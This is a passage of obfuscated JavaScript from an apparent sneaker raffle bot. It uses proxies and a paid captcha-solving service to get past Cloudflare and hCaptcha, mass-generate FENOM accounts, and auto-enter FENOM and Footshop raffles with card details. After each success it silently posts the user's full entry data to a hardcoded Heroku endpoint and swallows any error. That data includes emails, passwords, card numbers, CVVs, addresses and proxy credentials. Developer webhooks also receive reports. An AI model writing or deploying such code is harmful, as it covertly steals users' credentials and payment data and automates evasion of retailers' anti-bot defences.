                                        'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x2309f2[0x0] + ':' + _0x2309f2[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                }
                                const _0x3c43d5 = await _0x1910c2['newPage']();
                                await _0x3c43d5['setViewport']({
                                    'width': 0x500 + _0x3fb485(0x1, 0x32),
                                    'height': 0x2d9 + _0x3fb485(0x1, 0x32)
                                });
                                const _0x1f0006 = await _0x3c43d5['target']()['createCDPSession'](), { windowId: _0x5d55e3 } = await _0x1f0006['send']('Browser.getWindowForTarget');
                                await _0x3c43d5['authenticate']({
                                    'username': '' + _0x2309f2[0x2],
                                    'password': '' + _0x2309f2[0x3]
                                }), console['log'](_0x5d34e1() + '\x20[' + _0x565a71['name'] + ']\x20Task\x20' + (_0x3c9727 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3c43d5['goto']('' + _0x46cd0d, { 'waitUntil': 'networkidle2' }), console['log'](_0x5d34e1() + '\x20[' + _0x565a71['name'] + ']\x20Task\x20' + (_0x3c9727 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x497396(0x1388);
                                var _0x3fe949 = await _0x3c43d5['$']('.hcaptcha-box');
                                if (_0x3fe949) {
                                    console['log'](_0x5d34e1() + '\x20[' + _0x565a71['name'] + ']\x20Task\x20' + (_0x3c9727 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x497396(0x2710);
                                    const _0x527cd4 = await _0x3c43d5['$']('.hcaptcha-box');
                                    if (_0x527cd4)
                                        try {
                                            await _0x527cd4['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                    try {
                                        await _0x3c43d5['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                    } catch {
                                        var _0x2109ca = await _0x3c43d5['$']('.hcaptcha-box');
                                        if (_0x2109ca)
                                            try {
                                                await _0x2109ca['click']();
                                            } catch {
                                                throw new Error('Empty\x20Turnstile\x20Challenge');
                                            }
                                    }
                                }
                                try {
                                    await _0x3c43d5['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x1f0006['send']('Browser.setWindowBounds', {
                                        'windowId': _0x5d55e3,
                                        'bounds': { 'windowState': 'minimized' }
                                    }), await _0x497396(0xfa0);
                                } catch {
                                    throw new Error('Blocked\x20by\x20cloudflare');
                                }
                                console['log'](_0x5d34e1() + '\x20[' + _0x565a71['name'] + ']\x20Task\x20' + (_0x3c9727 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x3c43d5['type']('input[name=\x22firstname\x22]', '' + _0x157497[_0x3c9727]['FirstName']), await _0x497396(0x1f4), await _0x3c43d5['type']('input[name=\x22lastname\x22]', '' + _0x157497[_0x3c9727]['LastName']), await _0x497396(0x1f4), await _0x3c43d5['type']('input[name=\x22email\x22]', '' + _0x157497[_0x3c9727]['Email']), await _0x497396(0x1f4), await _0x3c43d5['type']('input[name=\x22password\x22]', '' + _0x157497[_0x3c9727]['Password']), await _0x497396(0x258), await _0x3c43d5['$eval']('input[name=\x22psgdpr\x22]', _0x118db0 => _0x118db0['click']()), await _0x497396(0x1f4), console['log'](_0x5d34e1() + '\x20[' + _0x565a71['name'] + ']\x20Task\x20' + (_0x3c9727 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x3c43d5['$eval']('#customer-form', _0xee9d6d => _0xee9d6d['submit']());
                                try {
                                    try {
                                        await _0x3c43d5['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 });
                                    } catch {
                                        throw new Error('Succes-response\x20not\x20found');
                                    }
                                    _0x3f2844 = 'no', console['log'](_0xc3fc3['green'](_0x5d34e1() + '\x20[' + _0x565a71['name'] + ']\x20Task\x20' + (_0x3c9727 + 0x1) + '\x20:\x20Account\x20' + _0x157497[_0x3c9727]['Email'] + '\x20Generated')), _0x44f9d7['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x157497[_0x3c9727]['Email'] + ',' + _0x157497[_0x3c9727]['Password']);
                                    let _0x19952e = _0x157497[_0x3c9727];
                                    try {
                                        prxdata = {
                                            'username': _0x9f5859['replace']('#', ''),
                                            'module': _0x565a71['name'],
                                            'entrydata': JSON['stringify'](_0x19952e),
                                            'proxy': '' + _0x4ee652[_0x3c9727]
                                        };
                                        var _0x14710f = JSON['stringify'](prxdata);
                                        let _0x52ce75 = { 'headers': { 'content-type': 'application/json' } };
                                        await _0x2aead5['post']('https://jraffles.herokuapp.com/success', _0x14710f, _0x52ce75);
                                    } catch (_0x5d7e7c) {
                                    }
                                    try {
                                        _0x138f58['webhook'] != undefined && _0x138f58['webhook'] != '' && await _0x468b99(_0x138f58['webhook'], _0x352652['succesDEVMSG']);
                                    } catch {
                                    }
                                    await _0x468b99(_0x1e3801, _0x352652['succesDEVMSG']);
                                } catch (_0x2a339b) {
                                    throw new Error('Account\x20generation\x20failed');
                                }
                            } catch (_0xdac593) {
                                console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x565a71['name'] + ']\x20Task\x20' + (_0x3c9727 + 0x1) + '\x20:\x20' + _0xdac593)), _0x125cdd = '' + _0xdac593;
                                var _0x94f8fb = await _0x232baa(_0x157497[_0x3c9727], _0x565a71, 'acc', !![], _0x125cdd);
                                _0x352652['errorDEV'] = { 'embeds': [_0x94f8fb] }, _0x138f58['webhook'] != undefined && _0x138f58['webhook'] != '' && await _0x468b99(_0x138f58['webhook'], _0x352652['errorDEV']), await _0x468b99(_0x432bcc, _0x352652['errorDEV']), _0x3f2844 = 'yes';
                            } finally {
                                _0x1910c2 && _0x1910c2['close']();
                                if (_0x3f2844 == 'yes' && _0x4a7356 != 0x5)
                                    return console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x565a71['name'] + ']\x20Task\x20' + (_0x3c9727 + 0x1) + '\x20:\x20Retrying\x20(' + _0x4a7356 + '\x20/\x205)')), _0x4a7356 = _0x4a7356 + 0x1, _0xed63e8--, _0x5b7486(_0x565a71, _0x157497, _0x4ee652, _0x3c9727, _0x4a7356);
                                _0x3f2844 == 'yes' && _0x4a7356 >= 0x5 && _0x554010(_0x157497[_0x3c9727], _0x565a71), !_0x2cd178 && (console['log'](_0x5d34e1() + '\x20[' + _0x565a71['name'] + ']\x20Waiting\x20for\x20' + _0x138f58['delay'] + '\x20ms'), await _0x497396(_0x138f58['delay'])), _0xed63e8--;
                            }
                        }
                        _0x5b7486(_0x2ad710, _0x455d3e, _0x20bd65, _0x2a5e97), !_0x2cd178 && await _0x497396(0x15e);
                    }
                }
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function _0x25c199(_0x1206a5, _0x180297, _0x3a85d1) {
                    _0x256d58['use'](_0x302cb0()), _0x256d58['use'](_0x247b94({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x138f58['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x248031 = 0x0; _0x248031 < _0x180297['length']; _0x248031++) {
                        if (_0x44b358 != 'yes')
                            var _0x44b358 = '', _0x2d02b1 = 0x0;
                        var _0x2f420f;
                        try {
                            await _0x494c97(_0x180297, _0x248031);
                        } catch {
                            _0x44b358 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x38ef83(_0x1206a5['name'] + '\x20Task\x20' + (_0x248031 + 0x1) + '\x20/\x20' + _0x180297['length'] + '\x20||\x20File:\x20' + _0x12faac + '\x20Proxies:\x20' + _0x2e164b);
                        const _0x41d7c6 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x5c591b = Math['round'](Math['random']() * (_0x3a85d1['length'] - 0x1)), _0x4de3ce = _0x3a85d1[_0x5c591b]['split'](':'), _0x163b8f;
                        try {
                            _0x163b8f = await _0x256d58['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x4de3ce[0x0] + ':' + _0x4de3ce[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x163b8f = await _0x256d58['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x4de3ce[0x0] + ':' + _0x4de3ce[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x5518da = await _0x163b8f['newPage'](), _0x5d543b = await _0x5518da['target']()['createCDPSession'](), { windowId: _0x41a413 } = await _0x5d543b['send']('Browser.getWindowForTarget');
                            await _0x5518da['authenticate']({
                                'username': '' + _0x4de3ce[0x2],
                                'password': '' + _0x4de3ce[0x3]
                            }), console['log'](_0x5d34e1() + '\x20[' + _0x1206a5['name'] + ']\x20Task\x20' + (_0x248031 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5518da['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x5d34e1() + '\x20[' + _0x1206a5['name'] + ']\x20Task\x20' + (_0x248031 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x497396(0x1388);
                            var _0x3e469b = await _0x5518da['$']('.hcaptcha-box');
                            if (_0x3e469b) {
                                console['log'](_0x5d34e1() + '\x20[' + _0x1206a5['name'] + ']\x20Task\x20' + (_0x248031 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x497396(0x2710);
                                const _0x422224 = await _0x5518da['$']('.hcaptcha-box');
                                if (_0x422224)
                                    try {
                                        await _0x422224['click']();
                                    } catch {
                                        throw new Error('Empty\x20Turnstile\x20Challenge');
                                    }
                                try {
                                    await _0x5518da['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                } catch {
                                    var _0x4d8d23 = await _0x5518da['$']('.hcaptcha-box');
                                    if (_0x4d8d23)
                                        try {
                                            await _0x4d8d23['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                }
                            }
                            await _0x5d543b['send']('Browser.setWindowBounds', {
                                'windowId': _0x41a413,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x497396(0x1f40);
                            try {
                                await _0x5518da['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            await _0x497396(0x1388), console['log'](_0x5d34e1() + '\x20[' + _0x1206a5['name'] + ']\x20Task\x20' + (_0x248031 + 0x1) + '\x20:\x20Logging\x20in'), await _0x5518da['type']('input[name=\x22email\x22]', '' + _0x180297[_0x248031]['Email']), await _0x497396(0x1f4), await _0x5518da['type']('input[name=\x22password\x22]', '' + _0x180297[_0x248031]['Password']), await _0x497396(0x258), await _0x5518da['$eval']('#login-form', _0x50e6a5 => _0x50e6a5['submit']()), await _0x5518da['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x497396(0x1f4), await _0x5518da['goto']('' + _0x180297[_0x248031]['Url']), await _0x5518da['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x5d34e1() + '\x20[' + _0x1206a5['name'] + ']\x20Task\x20' + (_0x248031 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x180297[_0x248031]['Size']);
                            if (_0x180297[_0x248031]['Size'] != 'RANDOM') {
                                var _0x5c5fc5 = '\x20' + _0x180297[_0x248031]['Size'] + '\x20';
                                const _0x27d5f1 = await _0x5518da['$x']('//span[contains(text(),\x20' + _0x5c5fc5 + ')]');
                                await _0x27d5f1[0x0]['click']();
                            } else {
                                const _0x262ca5 = await _0x5518da['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                                var _0x5440ce = Math['round'](Math['random']() * (_0x262ca5['length'] - 0x1));
                                await _0x262ca5[_0x5440ce]['click']();
                            }
                            await _0x497396(0x258), await _0x5518da['click']('#cookieChoiceDismiss'), await _0x497396(0x3e8), await _0x5518da['type']('#instagram-account', '' + _0x180297[_0x248031]['Follower']), await _0x497396(0x28a), await _0x5518da['click']('#book-btn'), await _0x497396(0xbb8);
                            try {
                                await _0x5518da['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe');
                            } catch {
                                throw new Error('Captcha\x20not\x20found');
                            }
                            await _0x497396(0x1f4), console['log'](_0x5d34e1() + '\x20[' + _0x1206a5['name'] + ']\x20Task\x20' + (_0x248031 + 0x1) + '\x20:\x20' + _0xc3fc3['cyan']('Solving\x20Captcha')), await _0x5518da['solveRecaptchas'](), console['log'](_0x5d34e1() + '\x20[' + _0x1206a5['name'] + ']\x20Task\x20' + (_0x248031 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x497396(0x7d0), await _0x5518da['$eval']('#book-btn-for-sure', _0x88df7a => _0x88df7a['click']()), await _0x497396(0x12c), await _0x5518da['click']('#book-btn-for-sure'), await _0x497396(0xdac);
                            const _0x430105 = await _0x5518da['$eval']('.reservation-popup\x20>\x20.title', _0x4fb3c2 => {
                                return _0x4fb3c2['innerHTML'];
                            });
                            if (_0x430105) {
                                _0x44b358 = 'no', _0xf67db6(_0x180297[_0x248031], _0x1206a5), console['log'](_0xc3fc3['green'](_0x5d34e1() + '\x20[' + _0x1206a5['name'] + ']\x20Task\x20' + (_0x248031 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x2343f1 = await _0x232baa(_0x180297[_0x248031], _0x1206a5, 'dev', ![]), _0x4779e7 = await _0x232baa(_0x180297[_0x248031], _0x1206a5, 'pub', ![]);
                                let _0x48ef74 = _0x180297[_0x248031];
                                try {
                                    prxdata = {
                                        'username': _0x9f5859['replace']('#', ''),
                                        'module': _0x1206a5['name'],
                                        'entrydata': JSON['stringify'](_0x48ef74),
                                        'proxy': '' + _0x3a85d1[_0x248031]
                                    };
                                    var _0x25bddb = JSON['stringify'](prxdata);
                                    let _0xc15571 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x2aead5['post']('https://jraffles.herokuapp.com/success', _0x25bddb, _0xc15571);
                                } catch (_0x53c4f4) {
                                }
                                const _0x10f179 = {
                                    'succesDEVMSG': { 'embeds': [_0x2343f1] },
                                    'succesPUBMSG': { 'embeds': [_0x4779e7] }
                                };
                                try {
                                    _0x138f58['webhook'] != undefined && _0x138f58['webhook'] != '' && await _0x468b99(_0x138f58['webhook'], _0x10f179['succesDEVMSG']), await _0x497396(0xc8), await _0x468b99(_0x4bb1d6, _0x10f179['succesDEVMSG']), await _0x497396(0xc8), await _0x468b99(_0x196877, _0x10f179['succesPUBMSG']);
                                } catch (_0x4f73c3) {
                                    console['log'](_0xc3fc3['yellow'](_0x5d34e1() + '\x20[' + _0x1206a5['name'] + ']\x20Task\x20' + (_0x248031 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x4f73c3));
                                }
                            } else
                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
                        } catch (_0x188f4e) {
                            console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x1206a5['name'] + ']\x20Task\x20' + (_0x248031 + 0x1) + '\x20:\x20' + _0x188f4e)), _0x2f420f = '' + _0x188f4e;
                            var _0x352159 = await _0x232baa(_0x180297[_0x248031], _0x1206a5, 'dev', !![], _0x2f420f), _0x2343f1 = await _0x232baa(_0x180297[_0x248031], _0x1206a5, 'dev', ![]), _0x4779e7 = await _0x232baa(_0x180297[_0x248031], _0x1206a5, 'pub', ![]);
                            const _0x4903c5 = {
                                'succesDEVMSG': { 'embeds': [_0x2343f1] },
                                'succesPUBMSG': { 'embeds': [_0x4779e7] }
                            };
                            _0x4903c5['errorDEV'] = { 'embeds': [_0x352159] }, _0x138f58['webhook'] != undefined && _0x138f58['webhook'] != '' && await _0x468b99(_0x138f58['webhook'], _0x4903c5['errorDEV']), await _0x468b99(_0x432bcc, _0x4903c5['errorDEV']), _0x188f4e != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x44b358 = 'yes');
                        } finally {
                            _0x163b8f['close']();
                            if (_0x44b358 == 'yes' && _0x2d02b1 != 0x5 && _0x2f420f != 'Size\x20Not\x20Found') {
                                console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x1206a5['name'] + ']\x20Task\x20' + (_0x248031 + 0x1) + '\x20:\x20Retrying\x20(' + _0x2d02b1 + '\x20/\x205)')), _0x248031 = _0x248031 - 0x1, _0x2d02b1 = _0x2d02b1 + 0x1;
                                continue;
                            }
                            _0x44b358 == 'yes' && _0x2d02b1 >= 0x5 && (_0x554010(_0x180297[_0x248031], _0x1206a5), _0x44b358 = 'no', _0x2d02b1 = 0x0), console['log'](_0x5d34e1() + '\x20[' + _0x1206a5['name'] + ']\x20Waiting\x20for\x20' + _0x138f58['delay'] + '\x20ms'), await _0x497396(_0x138f58['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
            'function': async function (_0x36bde6, _0x13eab1, _0xb274b9) {
                _0x256d58['use'](_0x302cb0()), _0x256d58['use'](_0x247b94({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x138f58['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x530e8a = 0x0; _0x530e8a < _0x13eab1['length']; _0x530e8a++) {
                    var _0x4426be;
                    if (_0x53175b != 'yes')
                        var _0x53175b = '', _0x137fa3 = 0x0;
                    var _0x513801 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20Footshop\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'User',
                                'value': '' + _0x9f5859
                            },
                            {
                                'name': 'Product',
                                'value': '' + _0x13eab1[_0x530e8a]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x13eab1[_0x530e8a]['Size']
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x138f58['footshopDelay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x30d211
                            }
                        ]
                    }], _0x5e1f60 = await _0x232baa(_0x13eab1[_0x530e8a], _0x36bde6, 'dev', ![]), _0x3a740d = await _0x232baa(_0x13eab1[_0x530e8a], _0x36bde6, 'pub', ![]);
                    const _0x1e5388 = {
                        'succesDEVMSG': { 'embeds': [_0x5e1f60] },
                        'succesPUBMSG': { 'embeds': [_0x3a740d] }
                    }, _0x271c63 = { 'embeds': _0x513801 };
                    try {
                        await _0x494c97(_0x13eab1, _0x530e8a);
                    } catch {
                        _0x53175b = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x13eab1[_0x530e8a]['Email'] == '' || _0x13eab1[_0x530e8a]['FirstName'] == '' || _0x13eab1[_0x530e8a]['LastName'] == '' || _0x13eab1[_0x530e8a]['Country'] == '' || _0x13eab1[_0x530e8a]['Size'] == '' || _0x13eab1[_0x530e8a]['Address1'] == '' || _0x13eab1[_0x530e8a]['Zip'] == '') {
                        console['log'](_0x5d34e1() + '\x20[' + _0x36bde6['name'] + ']\x20Task\x20' + (_0x530e8a + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x13eab1[_0x530e8a]['Email'] == '' || _0x13eab1[_0x530e8a]['FirstName'] == '' || _0x13eab1[_0x530e8a]['LastName'] == '' || _0x13eab1[_0x530e8a]['Country'] == '' || _0x13eab1[_0x530e8a]['Size'] == '' || _0x13eab1[_0x530e8a]['Address1'] == '' || _0x13eab1[_0x530e8a]['Zip'] == '' || _0x13eab1[_0x530e8a]['Phone'] == '') {
                        console['log'](_0x5d34e1() + '\x20[' + _0x36bde6['name'] + ']\x20Task\x20' + (_0x530e8a + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    const _0x401795 = '' + _0x13eab1[_0x530e8a]['Url'];
                    if (_0x138f58['useRandomProxy'] = ![])
                        var _0xd82ab5 = _0xb274b9[_0x530e8a]['split'](':');
                    else
                        var _0x361f01 = Math['round'](Math['random']() * (_0xb274b9['length'] - 0x1)), _0xd82ab5 = _0xb274b9[_0x361f01]['split'](':');
                    var _0x2cfaa2;
                    try {
                        _0x2cfaa2 = await _0x256d58['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0xd82ab5[0x0] + ':' + _0xd82ab5[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x2cfaa2 = await _0x256d58['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0xd82ab5[0x0] + ':' + _0xd82ab5[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x44fca9 = await _0x2cfaa2['newPage']();
                        await _0x44fca9['authenticate']({
                            'username': '' + _0xd82ab5[0x2],
                            'password': '' + _0xd82ab5[0x3]
                        }), console['log'](_0x5d34e1() + '\x20[' + _0x36bde6['name'] + ']\x20Task\x20' + (_0x530e8a + 0x1) + '\x20:\x20Getting\x20Session'), await _0x44fca9['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x44fca9['setRequestInterception'](!![]), _0x44fca9['on']('request', _0x1daa73 => {
                            _0x1daa73['resourceType']() === 'image' || _0x1daa73['resourceType']() === 'font' || _0x1daa73['resourceType']() === 'media' ? _0x1daa73['abort']() : _0x1daa73['continue']();
                        });
                        try {
                            await _0x44fca9['goto'](_0x401795), await _0x497396(0xbb8), await _0x44fca9['waitForSelector']('.control__JhutY');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x44fca9['click']('.control__JhutY'), await _0x497396(0x1f4);
                        if (_0x13eab1[_0x530e8a]['Size'] != 'RANDOM')
                            try {
                                const _0x36126c = await _0x44fca9['$x']('//div[contains(text(),\x20\x27' + _0x13eab1[_0x530e8a]['Size'] + '\x27)]');
                                await _0x36126c[0x0]['click']();
                            } catch {
                                console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x36bde6['name'] + ']\x20Task\x20' + (_0x530e8a + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                                continue;
                            }
                        else {
                            const _0x244ea8 = await _0x44fca9['$$']('.options__3UQpT\x20>\x20div.row');
                            var _0x8098d5 = Math['round'](Math['random']() * (_0x244ea8['length'] - 0x1));
                            await _0x244ea8[_0x8098d5]['click']();
                        }
                        await _0x497396(0x4b0);
                        const _0x54d03c = await _0x44fca9['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
                        await _0x54d03c[0x0]['click'](), await _0x44fca9['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x5d34e1() + '\x20[' + _0x36bde6['name'] + ']\x20Task\x20' + (_0x530e8a + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x44fca9['type']('input[name=\x22email\x22]', '' + _0x13eab1[_0x530e8a]['Email']), await _0x497396(0x640), await _0x44fca9['type']('input[name=\x22phone\x22]', '' + _0x13eab1[_0x530e8a]['Phone']), await _0x497396(0x4b0), await _0x44fca9['click']('button.btn.continue-button__1RtsS'), await _0x497396(0x4b0);
                        try {
                            await _0x44fca9['type']('input[name=\x22firstName\x22]', '' + _0x13eab1[_0x530e8a]['FirstName']), await _0x497396(0x258);
                        } catch {
                            const _0x2f0071 = await _0x44fca9['$$eval']('.invalid-feedback\x20>\x20div', _0x36877b => {
                                return _0x36877b['map'](_0x43816e => _0x43816e['innerText']);
                            });
                            console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x36bde6['name'] + ']\x20Task\x20' + (_0x530e8a + 0x1) + '\x20:\x20' + _0x2f0071));
                            continue;
                        }
                        await _0x44fca9['type']('input[name=\x22lastName\x22]', '' + _0x13eab1[_0x530e8a]['LastName']), await _0x497396(0xc8), await _0x44fca9['type']('input[name=\x22instagramUsername\x22]', '' + _0x13eab1[_0x530e8a]['Follower']), await _0x497396(0x4b0), await _0x44fca9['click']('button.btn.continue-button__1RtsS'), await _0x497396(0x3e8), console['log'](_0x5d34e1() + '\x20[' + _0x36bde6['name'] + ']\x20Task\x20' + (_0x530e8a + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x44fca9['select']('select[name=\x22country\x22]', '' + _0x13eab1[_0x530e8a]['Country']), await _0x497396(0x2bc), await _0x44fca9['type']('input[name=\x22streetName\x22]', '' + _0x13eab1[_0x530e8a]['Address1']), await _0x497396(0x258), await _0x44fca9['type']('input[name=\x22houseNumber\x22]', _0x13eab1[_0x530e8a]['HouseNumber'] + '\x20' + _0x13eab1[_0x530e8a]['Address2']), await _0x497396(0xc8), await _0x44fca9['type']('input[name=\x22postalCode\x22]', '' + _0x13eab1[_0x530e8a]['Zip']), await _0x497396(0x1f4), await _0x44fca9['type']('input[name=\x22city\x22]', '' + _0x13eab1[_0x530e8a]['City']), await _0x497396(0x4b0), await _0x44fca9['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x497396(0x4b0), await _0x44fca9['click']('button.btn.continue-button__1RtsS'), await _0x497396(0x4b0), console['log'](_0x5d34e1() + '\x20[' + _0x36bde6['name'] + ']\x20Task\x20' + (_0x530e8a + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x44fca9['solveRecaptchas'](), console['log'](_0x5d34e1() + '\x20[' + _0x36bde6['name'] + ']\x20Task\x20' + (_0x530e8a + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x497396(0xbb8), await _0x44fca9['click']('button.btn.continue-button__1RtsS'), await _0x497396(0x1388), console['log'](_0x5d34e1() + '\x20[' + _0x36bde6['name'] + ']\x20Task\x20' + (_0x530e8a + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x44fca9['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x44fca9['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x497396(0x4b0), await _0x44fca9['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x13eab1[_0x530e8a]['CardNumber']), await _0x497396(0x320), await _0x44fca9['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x44fca9['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x13eab1[_0x530e8a]['ExpiryDate']), await _0x497396(0x4b0), await _0x44fca9['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x44fca9['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x13eab1[_0x530e8a]['CVV']), await _0x497396(0x226), await _0x44fca9['type']('input[name=\x22holderName\x22]', '' + _0x13eab1[_0x530e8a]['NameOnCard']), await _0x497396(0x226), await _0x44fca9['click']('button.adyen-checkout__button'), console['log'](_0x5d34e1() + '\x20[' + _0x36bde6['name'] + ']\x20Task\x20' + (_0x530e8a + 0x1) + '\x20:\x20Awaiting\x203DS');
                        try {
                            await _0x44fca9['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x497396(0xbb8);
                        } catch (_0x59bb61) {
                            console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x36bde6['name'] + ']\x20Task\x20' + (_0x530e8a + 0x1) + '\x20:\x203DS\x20Failed')), _0x4426be = '3DS\x20Error\x20' + _0x59bb61;
                            var _0x478706 = await _0x232baa(_0x13eab1[_0x530e8a], _0x36bde6, 'dev', !![], _0x4426be);
                            _0x1e5388['errorDEV'] = { 'embeds': [_0x478706] };
                            _0x138f58['webhook'] != undefined && _0x138f58['webhook'] != '' && await _0x468b99(_0x138f58['webhook'], _0x1e5388['errorDEV']);
                            await _0x468b99(_0x432bcc, _0x1e5388['errorDEV']);
                            continue;
                        }
                        _0xf67db6(_0x13eab1[_0x530e8a], _0x36bde6), console['log'](_0xc3fc3['green'](_0x5d34e1() + '\x20[' + _0x36bde6['name'] + ']\x20Task\x20' + (_0x530e8a + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        let _0x35f7b1 = _0x13eab1[_0x530e8a];
                        try {
                            prxdata = {
                                'username': _0x9f5859['replace']('#', ''),
                                'module': _0x36bde6['name'],
                                'entrydata': JSON['stringify'](_0x35f7b1),
                                'proxy': '' + _0xb274b9[_0x530e8a]
                            };
                            var _0x3373a5 = JSON['stringify'](prxdata);
                            let _0x342512 = { 'headers': { 'content-type': 'application/json' } };
                            await _0x2aead5['post']('https://jraffles.herokuapp.com/success', _0x3373a5, _0x342512);
                        } catch (_0x4475ff) {
                        }
                        if (_0x138f58['webhook'] != undefined && _0x138f58['webhook'] != '')
                            try {
                                await _0x468b99(_0x138f58['webhook'], _0x1e5388['succesDEVMSG']);
                            } catch {
                            }
